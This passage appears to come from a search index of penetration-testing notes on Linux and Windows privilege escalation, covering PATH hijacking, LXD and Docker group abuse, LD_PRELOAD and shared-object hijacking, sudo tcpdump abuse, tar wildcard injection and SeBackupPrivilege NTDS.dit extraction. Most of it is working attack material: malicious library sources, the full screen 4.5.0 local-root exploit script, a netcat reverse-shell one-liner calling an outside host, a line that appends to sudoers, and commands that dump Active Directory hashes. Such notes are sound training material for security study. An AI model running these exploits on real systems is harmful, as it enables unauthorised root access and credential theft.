<code>/bin/ls</code>).</p> <pre><code>xyz_student@NIX02:~$ echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n</code></pre> <pre><code>xyz_student@NIX02:~$ PATH=.:${PATH}\nxyz_student@NIX02:~$ export PATH\nxyz_student@NIX02:~$ echo $PATH\n\n.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n</code></pre> <p>In this example, we modify the path to run a simple <code>echo</code> command when the command <code>ls</code> is typed.</p> <pre><code>xyz_student@NIX02:~$ touch ls\nxyz_student@NIX02:~$ echo 'echo \"PATH ABUSE!!\"' &gt; ls\nxyz_student@NIX02:~$ chmod +x ls\n</code></pre> <pre><code>xyz_student@NIX02:~$ ls\n\nPATH ABUSE!!\n</code></pre>","title":"Path Abuse"},{"location":"privesc/linux/privileged_groups/","text":"LXC / LXD <p>LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at <code>/mnt/root</code>. Let's confirm group membership and use these rights to escalate to root.</p> <pre><code>devops@NIX02:~$ id\n\nuid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)\n</code></pre> <p>Unzip the Alpine image.</p> <pre><code>devops@NIX02:~$ unzip alpine.zip \n\nArchive:  alpine.zip\nextracting: 64-bit Alpine/alpine.tar.gz  \ninflating: 64-bit Alpine/alpine.tar.gz.root  \ncd 64-bit\\ Alpine/\n</code></pre> <p>Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.</p> <pre><code>devops@NIX02:~$ lxd init\n\nDo you want to configure a new storage pool (yes/no) [default=yes]? yes\nName of the storage backend to use (dir or zfs) [default=dir]: dir\nWould you like LXD to be available over the network (yes/no) [default=no]? no\nDo you want to configure the LXD bridge (yes/no) [default=yes]? yes\n\n/usr/sbin/dpkg-reconfigure must be run as root\nerror: Failed to configure the bridge\n</code></pre> <p>Import the local image.</p> <pre><code>devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n\nGenerating a client certificate. This may take a minute...\nIf this is your first time using LXD, you should also run: sudo lxd init\nTo start your first container, try: lxc launch ubuntu:16.04\n\nImage imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b\n</code></pre> <p>Start a privileged container with the <code>security.privileged</code> set to <code>true</code> to run the container without a UID mapping, making the root user in the container the same as the root user on the host.</p> <pre><code>devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true\n\nCreating r00t\n</code></pre> <p>Mount the host file system.</p> <pre><code>devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n\nDevice mydev added to r00t\n</code></pre> <p>Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type <code>cd /mnt/root/root</code>. From here we can read sensitive files such as <code>/etc/shadow</code> and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.</p> <pre><code>devops@NIX02:~$ lxc start r00t\ndevops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh\n\n~ # id\nuid=0(root) gid=0(root)\n~ # \n</code></pre> Docker <p>Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command <code>docker run -v /root:/mnt -it ubuntu</code>. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as <code>/etc</code> which could be used to retrieve the contents of the <code>/etc/shadow</code> file for offline password cracking or adding a privileged user.</p> Disk <p>Users within the disk group have full access to any devices contained within <code>/dev</code>, such as <code>/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code>debugfs</code> to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.</p> ADM <p>Members of the adm group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.</p> <pre><code>secaudit@NIX02:~$ id\n\nuid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)\n</code></pre>","title":"Privileged Groups"},{"location":"privesc/linux/shared_libraries/","text":"<p>It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: <code>static libraries</code> (denoted by the .a file extension) and <code>dynamically linked shared object libraries</code> (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.</p> <p>There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the <code>-rpath</code> or <code>-rpath-link</code> flags when compiling a program, using the environmental variables <code>LD_RUN_PATH</code> or <code>LD_LIBRARY_PATH</code>, placing libraries in the <code>/lib</code> or <code>/usr/lib</code> default directories, or specifying another directory containing the libraries within the <code>/etc/ld.so.conf</code> configuration file.</p> <p>Additionally, the <code>LD_PRELOAD</code> environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the <code>ldd</code> utility.</p> <pre><code>xyz_student@NIX02:~$ ldd /bin/ls\n\n    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)\n    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)\n    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)\n    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)\n    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)\n</code></pre> <p>This lists all the libraries required by <code>/bin/ls</code>, along with their absolute paths.</p> LD_PRELOAD Privilege Escalation <p>Let's see an example of how we can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with <code>sudo</code> privileges.</p> <pre><code>xyz_student@NIX02:~$ sudo -l\n\nMatching Defaults entries for daniel.carter on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD\n\nUser daniel.carter may run the following commands on NIX02:\n    (root) NOPASSWD: /usr/sbin/apache2 restart\n</code></pre> <p>This user has rights to restart the Apache service as root, but since this is <code>NOT</code> a GTFOBin and the <code>/etc/sudoers</code> entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the <code>LD_PRELOAD</code> issue to run a custom shared library file. Let's compile the following library:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}\n</code></pre> <p>Compile <pre><code>xyz_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles\n</code></pre></p> <p>Finally, we can escalate privileges using the below command.</p> <pre><code>xyz_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart\n\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","title":"Shared Libraries"},{"location":"privesc/linux/shared_object_hijacking/","text":"<p>Programs and binaries under development usually have custom libraries associated with them. Consider the following <code>SETUID</code> binary.</p> <pre><code>xyz_student@NIX02:~$ ls -la payroll\n\n-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll\n</code></pre> <p>We can use ldd to print the shared object required by a binary or shared object. <code>Ldd</code> displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.</p> <pre><code>xyz_student@NIX02:~$ ldd payroll\n\nlinux-vdso.so.1 =&gt;  (0x00007ffcb3133000)\nlibshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)\nlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)\n</code></pre> <p>We see a non-standard library named <code>libshared.so</code> listed as a dependency for the binary. It is possible to load shared libraries from custom locations. One such setting is the <code>RUNPATH</code> configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.</p> <pre><code>xyz_student@NIX02:~$ readelf -d payroll  | grep PATH\n\n 0x000000000000001d (RUNPATH)            Library runpath: [/development]\n</code></pre> <p>The configuration allows the loading of libraries from the <code>/development</code> folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in <code>/development</code>, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).</p> <pre><code>xyz_student@NIX02:~$ ls -la /development/\n\ntotal 8\ndrwxrwxrwx  2 root root 4096 Sep  1 22:06 ./\ndrwxr-xr-x 23 root root 4096 Sep  1 21:26 ../\n</code></pre> <p>Before compiling a library, we need to find the function name called by the binary.</p> <pre><code>xyz_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so\n</code></pre> <pre><code>xyz_student@NIX02:~$ ldd payroll\n\nlinux-vdso.so.1 (0x00007ffd22bbc000)\nlibshared.so =&gt; /development/libshared.so (0x00007f0c13112000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)\n</code></pre> <pre><code>xyz_student@NIX02:~$ ./payroll \n\n./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery\n</code></pre> <p>We can copy an existing library to the <code>development</code> folder. Running <code>ldd</code> against the binary lists the library's path as <code>/development/libshared.</code>so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named <code>dbquery</code>. We can compile a shared object which includes this function.</p> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoid dbquery() {\n    printf(\"Malicious library loaded\\n\");\n    setuid(0);\n    system(\"/bin/sh -p\");\n} \n</code></pre> <p>The <code>dbquery</code> function sets our user id to 0 (root) and executing <code>/bin/sh</code> when called. Compile it using GCC.</p> <pre><code>xyz_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so\n</code></pre> <p>Executing the binary again should display the banner and pops a root shell.</p> <pre><code>xyz_student@NIX02:~$ ./payroll \n\n***************LEGALCO Freight Employee Database***************\n\nMalicious library loaded\n# id\nuid=0(root) gid=1000(mrb0b) groups=1000(mrb0b)\n</code></pre>","title":"Shared Object Hijacking"},{"location":"privesc/linux/special_permissions/","text":"<p>The <code>Set User ID upon Execution</code> (<code>setuid</code>) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges.The <code>setuid</code> bit appears as an <code>s</code>.</p> <pre><code>secops@kali[/kali]$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null\n\n-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/user/shared_obj_hijack/payroll\n-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb0b/payroll\n-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer\n-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount\n-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su\n-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount\n-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6\n-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount\n-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping\n-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g\n-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n</code></pre> <p>Many programs have additional features that can be leveraged to execute commands and, if the <code>setuid</code> bit is set on them, these can be used for our purpose.</p> <p>The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be leveraged in the same manner as <code>setuid</code> binaries to escalate privileges.</p> <pre><code>secops@kali[/kali]$ find / -user root -perm -6000 -exec ls -ldb {} \\; 2&gt;/dev/null\n\n-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine\n</code></pre> <p>This resource has more information about the <code>setuid</code> and <code>setgid</code> bits, including how to set the bits.</p>  GTFOBins <p>The GTFOBins project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, <code>apt-get</code> can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:</p> <pre><code>secops@kali[/kali]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","title":"Special Permissions"},{"location":"privesc/linux/sudo_rights_abuse/","text":"<p>Aways check to see if the current user has any sudo privileges by typing <code>sudo -l</code>. Sometimes we will need to know the user's password to list their <code>sudo</code> rights, but any rights entries with the <code>NOPASSWD</code> option can be seen without entering a password.</p> <pre><code>xyz_student@NIX02:~$ sudo -l\n\nMatching Defaults entries for sysadm on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sysadm may run the following commands on NIX02:\n    (root) NOPASSWD: /usr/sbin/tcpdump\n</code></pre> <p>For example, if the sudoers file is edited to grant a user the right to run a command such as <code>tcpdump</code> per the following entry in the sudoers file: <code>(ALL) NOPASSWD: /usr/sbin/tcpdump</code> an attacker could leverage this to take advantage of a the postrotate-command option.</p> <pre><code>xyz_student@NIX02:~$ man tcpdump\n\n&lt;SNIP&gt; \n-z postrorate-command              \n\nUsed in conjunction with the -C or -G options, this will make `tcpdump` run \" postrotate-command file \" where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.\n</code></pre> <p>By specifying the <code>-z</code> flag, an attacker could use <code>tcpdump</code> to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script <code>.test</code> containing a reverse shell:</p> <pre><code>xyz_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root\n</code></pre> <p>Make a file to execute with the <code>postrotate-command</code>, adding a simple reverse shell one-liner.</p> <p><pre><code>xyz_student@NIX02:~$ cat /tmp/.test\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f\n</code></pre> <pre><code>xyz_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root\n\ndropped privs to root\ntcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes\nMaximum file limit reached: 1\n1 packet captured\n6 packets received by filter\ncompress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied\n0 packets dropped by kernel\n</code></pre></p> <pre><code>secops@kali[/kali]$ nc -lnvp 443\n\nlistening on [any] 443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938\nbash: cannot set terminal process group (10797): Inappropriate ioctl for device\nbash: no job control in this shell\n\nroot@NIX02:~# id &amp;&amp; hostname               \nid &amp;&amp; hostname\nuid=0(root) gid=0(root) groups=0(root)\nNIX02\n</code></pre> <p>AppArmor in more recent distributions has predefined the commands used with the <code>postrotate-command</code>, effectively preventing command execution. Two best practices that should always be considered when provisioning <code>sudo</code> rights:</p> <ol> <li> <p>Always specify the absolute path to any binaries listed in the <code>sudoers</code> file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the <code>sudoers</code> entry specifies <code>cat</code> instead of <code>/bin/cat</code> this could likely be abused).</p> </li> <li> <p>Grant <code>sudo</code> rights sparingly and based on the principle of least privilege. Does the user need full <code>sudo</code> rights? Can they still perform their job with one or two entries in the <code>sudoers</code> file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.</p> </li> </ol>","title":"Sudo Rights Abuse"},{"location":"privesc/linux/vulnerable_services/","text":"<p>Many services may be found, which have flaws that can be leveraged to escalate privileges.</p> <p>Screen Version Identification <pre><code>secops@kali[/kali]$ screen -v\n\nScreen version 4.05.00 (GNU) 10-Dec-16\n</code></pre></p> <p>This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.</p> <pre><code>secops@kali[/kali]$ ./screen_exploit.sh \n\n~ gnu/screenroot ~\n[+] First, we create our shell and library...\n[+] Now we create our /etc/ld.so.preload file...\n[+] Triggering...\n' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.\n[+] done!\nNo Sockets found in /run/screen/S-mrb0b.\n\n# id\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb0b)\n</code></pre> <p>Screen_Exploit_POC.sh</p> <pre><code>#!/bin/bash\n# screenroot.sh\n# setuid screen v4.5.0 local root exploit\n# abuses ld.so.preload overwriting to get root.\n# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html\n# HACK THE PLANET\n# ~ infodox (25/1/2017)\necho \"~ gnu/screenroot ~\"\necho \"[+] First, we create our shell and library...\"\ncat &lt;&lt; EOF &gt; /tmp/libhax.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/stat.h&gt;\n__attribute__ ((__constructor__))\nvoid dropshell(void){\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n    printf(\"[+] done!\\n\");\n}\nEOF\ngcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c\nrm -f /tmp/libhax.c\ncat &lt;&lt; EOF &gt; /tmp/rootshell.c\n#include &lt;stdio.h&gt;\nint main(void){\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(\"/bin/sh\", NULL, NULL);\n}\nEOF\ngcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration\nrm -f /tmp/rootshell.c\necho \"[+] Now we create our /etc/ld.so.preload file...\"\ncd /etc\numask 000 # because\nscreen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\" # newline needed\necho \"[+] Triggering...\"\nscreen -ls # screen itself is setuid, so...\n/tmp/rootshell\n</code></pre>","title":"Vulnerable Services"},{"location":"privesc/linux/wilcard_abuse/","text":"<p>Examples of wild cards</p>    Character Significance     <code>*</code> An asterisk that can match any number of characters in a file name.   <code>?</code> Matches a single character.   <code>[ ]</code> Brackets enclose characters and can match any single one at the defined position.   <code>~</code> A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.   <code>-</code> A hyphen within brackets will denote a range of characters.    <p>An example of how wildcards can be abused for privilege escalation is the <code>tar</code> command, a common program for creating/extracting archives. If we look at the man page for the <code>tar</code> command, we see the following:</p> <pre><code>xyz_student@NIX02:~$ man tar\n\n&lt;SNIP&gt;\nInformative output\n       --checkpoint[=N]\n              Display progress messages every Nth record (default 10).\n\n       --checkpoint-action=ACTION\n              Run ACTION on each checkpoint.\n</code></pre> <p>The <code>--checkpoint-action</code> option permits an <code>EXEC</code> action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=sh root.sh</code> is passed to <code>tar</code> as command-line options.</p> <p>Consider the following cron job, which is set up to back up the <code>/root</code> directory's contents and create a compressed archive in <code>/tmp</code>. The cron job is set to run every minute, so it is a good candidate for privilege escalation.</p> <pre><code>#\n#\nmh dom mon dow command\n*/01 * * * * cd /tmp &amp;&amp; tar -zcf /tmp/backup.tar.gz *\n</code></pre> <p>We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.</p> <pre><code>xyz_student@NIX02:~$ echo 'echo \"cliff.moore ALL=(root) NOPASSWD: ALL\" &gt;&gt; /etc/sudoers' &gt; root.sh\nxyz_student@NIX02:~$ echo \"\" &gt; \"--checkpoint-action=exec=sh root.sh\"\nxyz_student@NIX02:~$ echo \"\" &gt; --checkpoint=1\n</code></pre> <p>Check and see that the necessary files were created.</p> <pre><code>xyz_student@NIX02:~$ ls -la\n\ntotal 56\ndrwxrwxrwt 10 root        root        4096 Aug 31 23:12 .\ndrwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..\n-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz\n-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1\n-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh\ndrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix\ndrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix\n-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh\n</code></pre> <p>Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.</p> <pre><code>xyz_student@NIX02:~$ sudo -l\n\nMatching Defaults entries for cliff.moore on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser cliff.moore may run the following commands on NIX02:\n    (root) NOPASSWD: ALL\n</code></pre>","title":"Wildcard Abuse"},{"location":"privesc/windows/builtin_groups/","text":"<p>Listing of all built-in Windows groups along with a detailed description of each   Listing of privileged accounts and groups in Active Directory</p> <p>Backup Operators</p> <p>The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL).</p> <p>We can use this PoC to exploit the SeBackupPrivilege, and copy this file.</p> <p>Importing Libraries <pre><code>PS C:\\xyz&gt; Import-Module .\\SeBackupPrivilegeUtils.dll\nPS C:\\xyz&gt; Import-Module .\\SeBackupPrivilegeCmdLets.dll\n</code></pre></p> <p>Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.</p> <pre><code>PS C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeMachineAccountPrivilege     Add workstations to domain     Disabled\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <pre><code>PS C:\\xyz&gt; Get-SeBackupPrivilege\n\nSeBackupPrivilege is disabled\n</code></pre> <p>Enabling SeBackupPrivilege with  <pre><code>PS C:\\xyz&gt; Set-SeBackupPrivilege\nPS C:\\xyz&gt; Get-SeBackupPrivilege\n\nSeBackupPrivilege is enabled\n</code></pre></p> <pre><code>PS C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeMachineAccountPrivilege     Add workstations to domain     Disabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>Copying a Protected File <pre><code>PS C:\\xyz&gt; dir C:\\Confidential\\\n\n    Directory: C:\\Confidential\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         5/6/2021   1:01 PM             88 2021 Contract.txt\n\n\nPS C:\\xyz&gt; cat 'C:\\Confidential\\2021 Contract.txt'\n\ncat : Access to the path 'C:\\Confidential\\2021 Contract.txt' is denied.\nAt line:1 char:1\n+ cat 'C:\\Confidential\\2021 Contract.txt'\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\Confidential\\2021 Contract.txt:String) [Get-Content], Unauthor\n   izedAccessException\n    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand\n</code></pre></p> <pre><code>PS C:\\xyz&gt; Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt\n\nCopied 88 bytes\n\n\nPS C:\\xyz&gt;  cat .\\Contract.txt\n\nLEGALCORP 2021 Contract\n\n==============================\n\nBoard of Directors:\n\n&lt;...SNIP...&gt;\n</code></pre> <p>The commands above demonstrate how sensitive information was accessed without possessing the required permissions.</p>  <p>As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.</p> <pre><code>PS C:\\xyz&gt; diskshadow.exe\n\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC,  10/14/2020 12:57:52 AM\n\nDISKSHADOW&gt; set verbose on\nDISKSHADOW&gt; set metadata C:\\Windows\\Temp\\meta.cab\nDISKSHADOW&gt; set context clientaccessible\nDISKSHADOW&gt; set context persistent\nDISKSHADOW&gt; begin backup\nDISKSHADOW&gt; add volume C: alias cdrive\nDISKSHADOW&gt; create\nDISKSHADOW&gt; expose %cdrive% E:\nDISKSHADOW&gt; end backup\nDISKSHADOW&gt; exit\n\nPS C:\\xyz&gt; dir E:\n\n\n    Directory: E:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         5/6/2021   1:00 PM                Confidential\nd-----        9/15/2018  12:19 AM                PerfLogs\nd-r---        3/24/2021   6:20 PM                Program Files\nd-----        9/15/2018   2:06 AM                Program Files (x86)\nd-----         5/6/2021   1:05 PM                Tools\nd-r---         5/6/2021  12:51 PM                Users\nd-----        3/24/2021   6:38 PM                Windows\n</code></pre> <p>Bypass the ACL and copy the NTDS.dit locally.</p> <pre><code>PS C:\\xyz&gt; Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\n\nCopied 16777216 bytes\n</code></pre> <p>The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using secretsdump.py</p> <pre><code>C:\\xyz&gt; reg save HKLM\\SYSTEM SYSTEM.SAV\n\nThe operation completed successfully.\n\n\nC:\\xyz&gt; reg save HKLM\\SAM SAM.SAV\n\nThe operation completed successfully.\n</code></pre> <p>If a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified.</p> <p>With the NTDS.dit extracted, we can use secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\DSInternals.psd1\nPS C:\\xyz&gt; $key = Get-BootKey -SystemHivePath .\\SYSTEM\nPS C:\\xyz&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=LEGALCORP,DC=local' -DBPath .\\ntds.dit -BootKey $key\n\nDistinguishedName: CN=Administrator,CN=Users,DC=LEGALCORP,DC=LOCAL\nSid: S-1-5-21-669053619-2741956077-1013132368-500\nGuid: f28ab72b-9b16-4b52-9f63-ef4ea96de215\nSamAccountName: Administrator\nSamAccountType: User\nUserPrincipalName:\nPrimaryGroupId: 513\nSidHistory:\nEnabled: True\nUserAccountControl: NormalAccount, PasswordNeverExpires\nAdminCount: True\nDeleted: False\nLastLogonDate: 5/6/2021 5:40:30 PM\nDisplayName:\nGivenName:\nSurname:\nDescription: Built-in account for administering the computer/domain\nServicePrincipalName:\nSecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,\nDiscretionaryAclProtected, SelfRelative\nOwner: S-1-5-21-669053619-2741956077-1013132368-512\nSecrets\n  NTHash: cf3a5525ee9414229e66279623ed5c58\n  LMHash:\n  NTHashHistory:\n  LMHashHistory:\n  SupplementalCredentials:\n    ClearText:\n    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7\n    Kerberos:\n      Credentials:\n        DES_CBC_MD5\n          Key: d60dfbbf20548938\n      OldCredentials:\n      Salt: WIN-NB4NGP3TKNKAdministrator\n      Flags: 0\n    KerberosNew:\n      Credentials:\n        AES256_CTS_HMAC_SHA1_96\n          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43\n          Iterations: 4096\n        AES128_CTS_HMAC_SHA1_96\n          Key: 94c300d0e47775b407f2496a5cca1a0a\n          Iterations: 4096\n        DES_CBC_MD5\n          Key: d60dfbbf20548938\n          Iterations: 4096\n      OldCredentials:\n      OlderCredentials:\n      ServiceCredentials:\n      Salt: WIN-NB4NGP3TKNKAdministrator\n      DefaultIterationCount: 4096\n      Flags: 0\n    WDigest:\nKey Credentials:\nCredential Roaming\n  Created:\n  Modified:\n  Credentials:\n</code></pre> <p>We can also use SecretsDump offline to extract hashes 